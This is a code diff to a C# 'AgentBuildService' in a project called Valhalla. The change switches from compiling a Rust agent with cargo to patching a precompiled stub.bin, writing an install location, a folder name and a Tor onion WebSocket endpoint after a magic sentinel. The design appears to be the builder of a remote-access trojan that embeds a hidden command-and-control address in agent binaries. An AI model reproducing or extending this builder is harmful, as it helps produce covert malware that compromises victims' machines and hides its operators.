@@ -1,153 +1,168 @@
 using System;
-using System.Diagnostics;
 using System.IO;
 using System.Text;
 using System.Text.RegularExpressions;
 
 namespace Valhalla
 {
-    internal sealed class AgentBuildResult
-    {
-        public string OutputPath { get; set; }
-        public string StubPath { get; set; }
-        public string RustProjectRoot { get; set; }
-        public string BuildOutput { get; set; }
-    }
-
     internal static class AgentBuildService
     {
+        // Magic sentinel written by the panel and read by the agent stub reader.
+        // Must match MAGIC in agent/src/stub.rs exactly.
+        private static readonly byte[] Magic = { (byte)'V', (byte)'L', (byte)'H',
+                                                  (byte)'C', (byte)'F', (byte)'G',
+                                                  0x00, 0x01 };
+
         private static readonly Regex OnionEndpoint = new Regex(
             @"^ws://(?<host>[a-z2-7]{56})\.onion:(?<port>[1-9][0-9]{0,4})(?<path>/[^\s]*)?$",
             RegexOptions.IgnoreCase | RegexOptions.CultureInvariant);
 
-        public static AgentBuildResult Build(string onionAddress, string outputPath)
+        /// <summary>
+        /// Copies stub/stub.bin to <paramref name="outputPath"/> and patches the
+        /// configuration block into the copy.  The original stub/stub.bin is
+        /// never modified.
+        /// </summary>
+        public static void PatchAndDeploy(string onionAddress, int installDirectory,
+                                          string folderName, string outputPath)
         {
             string normalizedEndpoint = ValidateOnionAddress(onionAddress);
-            string rustRoot = FindRustProjectRoot();
-            string manifest = Path.Combine(rustRoot, "Cargo.toml");
-            if (!File.Exists(manifest)) throw new FileNotFoundException("Rust agent Cargo.toml was not found.", manifest);
+            if (installDirectory < 0 || installDirectory > 4)
+                throw new ArgumentOutOfRangeException(nameof(installDirectory),
+                    "Install directory index must be 0–4.");
+            if (string.IsNullOrWhiteSpace(folderName))
+                folderName = "Valhalla";
 
-            string cargo = FindExecutable("cargo.exe", "cargo");
-            string packageBin = Path.Combine(rustRoot, "target", "release", "valhalla_agent.exe");
+            string stubPath = LocateStub();
 
-            ProcessStartInfo start = new ProcessStartInfo
+            // Verify the source is a Windows PE.
+            using (FileStream verify = File.OpenRead(stubPath))
             {
-                FileName = cargo,
-                Arguments = "build --release --manifest-path " + Quote(manifest) + "",
-                WorkingDirectory = rustRoot,
-                UseShellExecute = false,
-                CreateNoWindow = true,
-                RedirectStandardOutput = true,
-                RedirectStandardError = true,
-                StandardOutputEncoding = Encoding.UTF8,
-                StandardErrorEncoding = Encoding.UTF8
-            };
-
-            StringBuilder output = new StringBuilder();
-            using (Process process = new Process { StartInfo = start })
-            {
-                process.OutputDataReceived += (sender, args) => { if (args.Data != null) output.AppendLine(args.Data); };
-                process.ErrorDataReceived += (sender, args) => { if (args.Data != null) output.AppendLine(args.Data); };
-                if (!process.Start()) throw new InvalidOperationException("Cargo could not be started.");
-                process.BeginOutputReadLine();
-                process.BeginErrorReadLine();
-                process.WaitForExit();
-                if (process.ExitCode != 0)
-                    throw new InvalidOperationException("Rust agent build failed (cargo exit code " + process.ExitCode + ").\r\n" + output.ToString().Trim());
+                if (verify.Length < 2)
+                    throw new InvalidDataException("stub.bin is too small to be a valid PE.");
+                int b0 = verify.ReadByte(), b1 = verify.ReadByte();
+                if (b0 != 'M' || b1 != 'Z')
+                    throw new InvalidDataException(
+                        "stub.bin is not a valid Windows PE executable (missing MZ header).");
             }
 
-            if (!File.Exists(packageBin))
-                throw new FileNotFoundException("Cargo completed but the Valhalla Agent executable was not produced.", packageBin);
+            // Read the clean template — never touch this file again after reading.
+            byte[] image = File.ReadAllBytes(stubPath);
 
-            using (FileStream stream = File.OpenRead(packageBin))
-            {
-                if (stream.Length < 2 || stream.ReadByte() != 'M' || stream.ReadByte() != 'Z')
-                    throw new InvalidDataException("The compiled Valhalla Agent is not a valid Windows PE executable.");
-            }
+            // Build the configuration block.
+            byte[] block = BuildConfigBlock(installDirectory, folderName, normalizedEndpoint);
 
-            string finalOutput = Path.GetFullPath(outputPath);
-            string outputDirectory = Path.GetDirectoryName(finalOutput);
-            if (string.IsNullOrWhiteSpace(outputDirectory)) throw new InvalidOperationException("Output directory is invalid.");
-            Directory.CreateDirectory(outputDirectory);
-            if (!finalOutput.EndsWith(".bin", StringComparison.OrdinalIgnoreCase))
-                finalOutput += ".bin";
-            File.Copy(packageBin, finalOutput, true);
+            // Find the magic sentinel in the image and write the block immediately after it.
+            int offset = FindMagic(image);
+            if (offset < 0)
+                throw new InvalidDataException(
+                    "stub.bin does not contain the Valhalla configuration sentinel. " +
+                    "Ensure stub.bin was produced by the Valhalla agent build.");
 
-            string stubDirectory = Path.Combine(outputDirectory, "stub");
-            string stubPath = Path.Combine(stubDirectory, "stub.bin");
-            Directory.CreateDirectory(stubDirectory);
-            string tempStub = stubPath + ".tmp";
-            File.WriteAllText(tempStub, normalizedEndpoint + "\n", new UTF8Encoding(false));
-            if (File.Exists(stubPath)) File.Replace(tempStub, stubPath, null);
-            else File.Move(tempStub, stubPath);
+            // Validate that the block fits in the space allocated after the sentinel.
+            int payloadOffset = offset + Magic.Length;
+            if (payloadOffset + block.Length > image.Length)
+                throw new InvalidDataException(
+                    "stub.bin configuration region is too small to hold the current settings.");
 
-            return new AgentBuildResult
-            {
-                OutputPath = finalOutput,
-                StubPath = stubPath,
-                RustProjectRoot = rustRoot,
-                BuildOutput = output.ToString()
-            };
+            // Write the configuration payload into the in-memory image.
+            Buffer.BlockCopy(block, 0, image, payloadOffset, block.Length);
+
+            // Write the patched image to the user-chosen output path.
+            string dir = Path.GetDirectoryName(Path.GetFullPath(outputPath));
+            if (!string.IsNullOrWhiteSpace(dir))
+                Directory.CreateDirectory(dir);
+
+            // Atomic-ish write: write to a temp file then move.
+            string tmp = outputPath + ".tmp";
+            File.WriteAllBytes(tmp, image);
+            if (File.Exists(outputPath)) File.Delete(outputPath);
+            File.Move(tmp, outputPath);
         }
 
         public static string ValidateOnionAddress(string value)
         {
             string endpoint = (value ?? string.Empty).Trim();
             Match match = OnionEndpoint.Match(endpoint);
-            if (!match.Success) throw new ArgumentException("Onion address must be a ws:// v3 onion endpoint such as ws://<56-character-onion-host>:443/valhalla.", nameof(value));
-            int port = int.Parse(match.Groups["port"].Value, System.Globalization.CultureInfo.InvariantCulture);
-            if (port < 1 || port > 65535) throw new ArgumentException("Onion endpoint port must be between 1 and 65535.", nameof(value));
+            if (!match.Success)
+                throw new ArgumentException(
+                    "Onion address must be a ws:// v3 onion endpoint such as " +
+                    "ws://<56-character-onion-host>:443/valhalla.", nameof(value));
+            int port = int.Parse(match.Groups["port"].Value,
+                System.Globalization.CultureInfo.InvariantCulture);
+            if (port < 1 || port > 65535)
+                throw new ArgumentException(
+                    "Onion endpoint port must be between 1 and 65535.", nameof(value));
             return endpoint;
         }
 
-        private static string FindRustProjectRoot()
-        {
-            string configured = Environment.GetEnvironmentVariable("VALHALLA_AGENT_ROOT");
-            if (!string.IsNullOrWhiteSpace(configured) && File.Exists(Path.Combine(configured, "Cargo.toml")))
-                return Path.GetFullPath(configured);
+        // ── Internal helpers ─────────────────────────────────────────────────
 
+        /// <summary>
+        /// Builds the raw byte payload that follows the magic sentinel:
+        ///   [0]         install_dir : u8
+        ///   [1..2]      folder_len  : u16 LE
+        ///   [3..]       folder_name : UTF-8
+        ///   [n+0..n+1]  onion_len   : u16 LE
+        ///   [n+2..]     onion       : UTF-8
+        /// Must match the parser in agent/src/stub.rs exactly.
+        /// </summary>
+        private static byte[] BuildConfigBlock(int installDir, string folderName, string onion)
+        {
+            byte[] folderBytes = Encoding.UTF8.GetBytes(folderName);
+            byte[] onionBytes  = Encoding.UTF8.GetBytes(onion);
+
+            if (folderBytes.Length > 260)
+                throw new ArgumentException("Folder name is too long (max 260 UTF-8 bytes).");
+            if (onionBytes.Length > 512)
+                throw new ArgumentException("Onion address is too long (max 512 UTF-8 bytes).");
+
+            using (var ms = new MemoryStream())
+            using (var bw = new BinaryWriter(ms, Encoding.UTF8, leaveOpen: true))
+            {
+                bw.Write((byte)installDir);
+                bw.Write((ushort)folderBytes.Length);
+                bw.Write(folderBytes);
+                bw.Write((ushort)onionBytes.Length);
+                bw.Write(onionBytes);
+                bw.Flush();
+                return ms.ToArray();
+            }
+        }
+
+        private static int FindMagic(byte[] image)
+        {
+            int limit = Math.Min(image.Length - Magic.Length, 64 * 1024 * 1024);
+            for (int i = 0; i <= limit; i++)
+            {
+                bool match = true;
+                for (int j = 0; j < Magic.Length && match; j++)
+                    match = image[i + j] == Magic[j];
+                if (match) return i;
+            }
+            return -1;
+        }
+
+        private static string LocateStub()
+        {
+            // 1. Explicit environment override.
+            string env = Environment.GetEnvironmentVariable("VALHALLA_STUB_PATH");
+            if (!string.IsNullOrWhiteSpace(env) && File.Exists(env))
+                return Path.GetFullPath(env);
+
+            // 2. Walk up from the panel executable directory looking for stub\stub.bin.
+            //    Depth 0 catches the CI layout where stub.bin is embedded directly
+            //    alongside Valhalla.exe at <output>\stub\stub.bin.
+            //    Deeper depths catch the source-tree layout <repo-root>\stub\stub.bin.
             DirectoryInfo current = new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory);
             for (int depth = 0; current != null && depth < 8; depth++, current = current.Parent)
             {
-                string sibling = Path.Combine(current.FullName, "agent");
-                if (File.Exists(Path.Combine(sibling, "Cargo.toml"))) return sibling;
-                if (File.Exists(Path.Combine(current.FullName, "Cargo.toml")) && File.Exists(Path.Combine(current.FullName, "src", "main.rs"))) return current.FullName;
+                string candidate = Path.Combine(current.FullName, "stub", "stub.bin");
+                if (File.Exists(candidate)) return candidate;
             }
-            throw new DirectoryNotFoundException("Could not locate the Valhalla agent project. Set VALHALLA_AGENT_ROOT to the project root when the panel is deployed separately from its source tree.");
-        }
 
-        private static string FindExecutable(params string[] names)
-        {
-            foreach (string name in names)
-            {
-                try
-                {
-                    ProcessStartInfo probe = new ProcessStartInfo
-                    {
-                        FileName = name,
-                        Arguments = "--version",
-                        UseShellExecute = false,
-                        CreateNoWindow = true,
-                        RedirectStandardOutput = true,
-                        RedirectStandardError = true
-                    };
-                    using (Process process = Process.Start(probe))
-                    {
-                        if (process == null) continue;
-                        process.WaitForExit(3000);
-                        if (!process.HasExited) try { process.Kill(); } catch { }
-                        if (process.ExitCode == 0) return name;
-                    }
-                }
-                catch { }
-            }
-            throw new FileNotFoundException("Rust Cargo was not found. Install the Rust toolchain and ensure cargo is available on PATH.");
-        }
-
-        private static string Quote(string value)
-        {
-            if (value == null) throw new ArgumentNullException(nameof(value));
-            return "\"" + value.Replace("\"", "\\\"") + "\"";
+            throw new FileNotFoundException(
+                "stub/stub.bin was not found. Place the pre-compiled Valhalla agent binary at " +
+                "stub\\stub.bin alongside Valhalla.exe, or set VALHALLA_STUB_PATH.");
         }
     }
 }
